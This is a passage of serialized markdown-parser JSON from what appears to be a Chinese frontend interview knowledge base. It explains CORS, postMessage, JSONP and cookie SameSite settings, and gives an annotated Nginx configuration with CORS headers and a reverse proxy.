级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","task":false,"loose":false,"text":"**1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","tokens":[{"type":"text","raw":"**1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n\\n配置响应头如下","text":"**1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 跨域资源共享（CORS - Cross-Origin Resource Sharing）:","text":" 跨域资源共享（CORS - Cross-Origin Resource Sharing）:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。","text":"\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：假设前端页面的源是 ","text":"\\n&emsp;示例：假设前端页面的源是 ","escaped":false},{"type":"codespan","raw":"`https://example.com`","text":"https://example.com"},{"type":"text","raw":"（协议为 https，域名是 example.com），要向 ","text":"（协议为 https，域名是 example.com），要向 ","escaped":false},{"type":"codespan","raw":"`https://api.example.com`","text":"https://api.example.com"},{"type":"text","raw":"（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端","text":"（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端","escaped":false},{"type":"codespan","raw":"`（https://api.example.com）`","text":"（https://api.example.com）"},{"type":"text","raw":"如果要允许来自 ","text":"如果要允许来自 ","escaped":false},{"type":"codespan","raw":"`https://example.com`","text":"https://example.com"},{"type":"text","raw":" 的跨域请求，可以\\n配置响应头如下","text":" 的跨域请求，可以\\n配置响应头如下","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nAccess-Control-Allow-Origin: https://example.com\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\\nAccess-Control-Allow-Headers: Content-Type\\n//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会\\n//知道这个跨域请求是被允许的，进而正常处理返回的数据。\\n```","lang":"js","text":"Access-Control-Allow-Origin: https://example.com\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\\nAccess-Control-Allow-Headers: Content-Type\\n//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会\\n//知道这个跨域请求是被允许的，进而正常处理返回的数据。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","task":false,"loose":false,"text":"**2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","tokens":[{"type":"text","raw":"**2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n\\n向 iframe 中的页面发送消息:","text":"**2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 跨文档消息传递（Cross-Document Messaging）:","text":" 跨文档消息传递（Cross-Document Messaging）:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。","text":"\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：在页面 ","text":"\\n&emsp;示例：在页面 ","escaped":false},{"type":"codespan","raw":"`https://parent.com`","text":"https://parent.com"},{"type":"text","raw":" 中有一个 iframe 加载了 ","text":" 中有一个 iframe 加载了 ","escaped":false},{"type":"codespan","raw":"`https://child.com`","text":"https://child.com"},{"type":"text","raw":" 的页面。在 ","text":" 的页面。在 ","escaped":false},{"type":"codespan","raw":"`https://parent.com`","text":"https://parent.com"},{"type":"text","raw":" 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","text":" 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst iframe = document.getElementById(\'myIframe\');\\niframe.contentWindow.postMessage(\'这是一条消息\', \'https://child.com\');\\n```","lang":"js","text":"const iframe = document.getElementById(\'myIframe\');\\niframe.contentWindow.postMessage(\'这是一条消息\', \'https://child.com\');"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"<br/>\\n&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:\\n\\n","pre":false,"text":"<br/>\\n&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:\\n\\n"},{"type":"code","raw":"```js\\nwindow.addEventListener(\'message\', function(event) {\\n    if (event.origin === \'https://parent.com\') {\\n        console.log(\'收到来自父页面的消息：\', event.data);\\n        // 可以在这里根据消息内容进行相应操作\\n    }\\n});\\n```","lang":"js","text":"window.addEventListener(\'message\', function(event) {\\n    if (event.origin === \'https://parent.com\') {\\n        console.log(\'收到来自父页面的消息：\', event.data);\\n        // 可以在这里根据消息内容进行相应操作\\n    }\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","task":false,"loose":false,"text":"**1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","tokens":[{"type":"text","raw":"**1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","text":"**1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JSONP（虽然存在安全隐患，但曾是一种跨域手段）:","text":" JSONP（虽然存在安全隐患，但曾是一种跨域手段）:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：JSONP 利用了 ","text":"\\n&emsp;原理：JSONP 利用了 ","escaped":false},{"type":"codespan","raw":"`<script>`","text":"<script>"},{"type":"text","raw":" 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 ","text":" 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 ","escaped":false},{"type":"codespan","raw":"`<script>`","text":"<script>"},{"type":"text","raw":" 标签时，就会执行这个函数从而获取到数据。","text":" 标签时，就会执行这个函数从而获取到数据。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：前端页面需要从 ","text":"\\n&emsp;示例：前端页面需要从 ","escaped":false},{"type":"codespan","raw":"`https://api.example.com`","text":"https://api.example.com"},{"type":"text","raw":" 获取数据，在页面中可以这样写：","text":" 获取数据，在页面中可以这样写：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction handleData(data) {\\n    console.log(\'获取到的数据：\', data);\\n}\\n<script src=\\"https://api.example.com/getData?callback=handleData\\"><\/script>\\n//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ \\"name\\": \\"张三\\", \\"age\\": 20 }) 的内容，浏览\\n// 器加载这个 <script> 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用\\n// 较少，多被 CORS 等更安全的机制替代。\\n```","lang":"js","text":"function handleData(data) {\\n    console.log(\'获取到的数据：\', data);\\n}\\n<script src=\\"https://api.example.com/getData?callback=handleData\\"><\/script>\\n//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ \\"name\\": \\"张三\\", \\"age\\": 20 }) 的内容，浏览\\n// 器加载这个 <script> 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用\\n// 较少，多被 CORS 等更安全的机制替代。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","task":false,"loose":false,"text":"**2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","tokens":[{"type":"text","raw":"**2：** 同源策略下的 Cookie 限制:<br/>\\n\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","text":"**2：** 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 同源策略下的 Cookie 限制:","text":" 同源策略下的 Cookie 限制:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。","text":"\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","text":"\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nhttp.createServer((req, res) => {\\n    res.writeHead(200, {\\n        \'Set-Cookie\': \'myCookie=value; Domain=.example.com; SameSite=Lax; Path=/\'\\n    });\\n    res.end(\'Cookie已设置\');\\n}).listen(3000);\\n//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。\\n//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。\\n```","lang":"js","text":"http.createServer((req, res) => {\\n    res.writeHead(200, {\\n        \'Set-Cookie\': \'myCookie=value; Domain=.example.com; SameSite=Lax; Path=/\'\\n    });\\n    res.end(\'Cookie已设置\');\\n}).listen(3000);\\n//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。\\n//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"Nginx","content":"<h1>Nginx</h1>\\n<h2>基础配置</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<pre><code class=\\"language-conf\\"># Nginx 启动时创建的 worker 进程的数量\\nworker_processes  1;\\n\\n# 配置 Nginx 主进程的 PID 文件路径\\n#pid        logs/nginx.pid;\\n\\nevents {\\n    # 指定每个 worker 进程可以同时处理的最大连接数\\n    worker_connections  1024;\\n}\\n\\nhttp {\\n    include       mime.types;\\n    default_type  application/octet-stream;\\n\\n    # 提高文件传输的效率，特别是对于大文件来说\\n    sendfile        on;\\n    # 用于减少网络传输中的数据包数量，通过将多个小数据包合并成一个大数据包来提高网络传输的效率\\n    tcp_nopush     on;\\n\\n    # 指定了空闲连接的超时时间，即客户端和服务器之间保持连接的最长时间\\n    # 在这里，连接在 65 秒内没有任何活动就会被关闭。通过调整此值，您可以控制服务器上空闲连接的数量，以及资源的有效利用程度\\n    keepalive_timeout  65;\\n\\n    # 启用 HTTP 响应的压缩功能，以减少传输的数据量，提高网络传输效率\\n    gzip  on;\\n\\n    server {\\n        # 端口\\n        listen       8099;\\n        server_name  localhost;\\n        \\n        location / {\\n            root html-vue;\\n            # hash 路由的重定向\\n            try_files $uri $uri/ /index.html;\\n            index index.html;\\n            # 跨域\\n            add_header &#39;Access-Control-Allow-Origin&#39; &#39;*&#39;;\\n            # 允许跨域请求的方法包括 GET、POST 和 OPTIONS\\n            add_header &#39;Access-Control-Allow-Methods&#39; &#39;GET, POST, OPTIONS&#39;;\\n            # 允许跨域请求携带的自定义请求头\\n            add_header &#39;Access-Control-Allow-Headers&#39; &#39;DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&#39;;\\n            \\n            # 确保浏览器在使用缓存前必须与服务器确认资源是否被修改过\\n            if ($request_filename ~* ^.*?.(html|htm|js)$) {\\n              add_header Cache-Control no-cache;\\n            }\\n        }\\n\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理 - 作用是不在 vue 项目中写死 ip\\n        # 这样配置后，再也不用给前端里面写固定的 ip\\n        location /data {\\n            # 删除 url 中的 /data 但是目前貌似不生效\\n            # rewrite ^/data/(.*)$ /$1 break;\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n\\n    # 基础访问\\n    server {\\n        listen       